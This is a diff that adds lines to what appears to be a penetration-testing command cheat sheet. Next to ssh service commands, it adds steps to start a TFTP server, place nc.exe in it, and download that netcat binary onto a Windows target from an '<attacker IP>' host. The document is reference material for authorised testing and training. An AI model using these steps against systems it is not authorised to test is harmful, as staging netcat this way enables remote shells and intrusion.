@@ -173,6 +173,13 @@ service ssh start                      Start ssh.
 netstat -antp | grep ssh               Verify the service is running.
 update-rc.d ssh enable                 Enable ssh to start at boot time.
 update-rc.d ssh disable                Disable ssh from starting at boot time.
+
+mkdir /tftp                            Create a new home folder for tftp.
+atftpd --daemon --port 69 /tftp        Start tftp.
+netstat -anup | grep atftp             Verify the service is running.
+cp /usr/share/windows-binaries/nc.exe /tftp/
+tftp -i <attacker IP> get nc.exe       Ran from Windowns.
+
 ------------------------------------------------------------------------------------------------------
 
 # Update procedure
